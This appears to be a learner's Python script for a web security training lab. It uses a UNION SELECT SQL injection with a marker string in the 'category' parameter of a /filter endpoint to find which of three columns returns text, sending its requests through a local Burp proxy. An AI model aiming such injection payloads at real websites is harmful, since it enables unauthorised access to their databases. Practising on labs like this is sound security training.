#! /usr/bin/env python

import requests  # to make web requests
import sys  # system module to use for arguments


def exploit(base_url: str) -> None:  
    for count in range(3): #as we have 3 columns we need to stop at 3
        letter = ["NULL","NULL","NULL"] #maing our payload list
        letter[count] = "'eu8G3N'" #adding null variable, having it iteratre through the list, using the count number so it goes a, null, null then null, a, null etc    
        response = requests.get(
            base_url + "/filter",
            params={"category": f'Clothing, shoes and accessories \' UNION SELECT {letter[0]}, {letter[1]}, {letter[2]}-- '},#fstring for nulls, adding the leters in for nulls to dynamically add it in, needed to escape the ' before UNION so used \.
            proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            verify=False,
        )  # category is the key and the value is clothing, everything after the ? are the parameters in the URL also sending through Burp
        
        if response.status_code == 200:
            print(f"you have successfully completed the lab, column {count + 1} is writeable") #used an f string to add the count variable in. had to add 1 as count starts counting at 0

        

def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
